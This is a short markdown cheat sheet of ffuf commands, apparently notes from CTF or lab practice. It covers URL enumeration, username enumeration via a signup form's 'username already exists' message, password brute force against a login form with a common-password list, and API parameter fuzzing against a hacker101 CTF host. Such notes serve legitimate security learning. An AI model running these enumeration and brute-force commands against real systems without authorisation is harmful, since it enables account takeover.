[![Build Status](https://travis-ci.org/joemccann/dillinger.svg?branch=master)](https://travis-ci.org/joemccann/dillinger)

# ffuf
<hr/>

## Enumerate URLs with Ffuf
```sh
ffuf -u http://localhost:3000/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
```

## username enumeration
http://10.10.13.16/customers/signup

```sh
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.13.16/customers/signup -mr "username already exists"
```

## brute force
http://10.10.13.16/customers/login

```sh
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.13.16/customers/login -fc 200
```


### Find api Parameter

find whent it always return 200 
```sh
ffuf -u https://3c16143e884e5b3fe326d43bcad3d616.ctf.hacker101.com/api/v1/status?FUZZ=1 -w ~/wordlist/fuzz-lfi-params-list.txt -fs 1-20 -s
```

-fs 1-20, filter by size  
-s scilent mode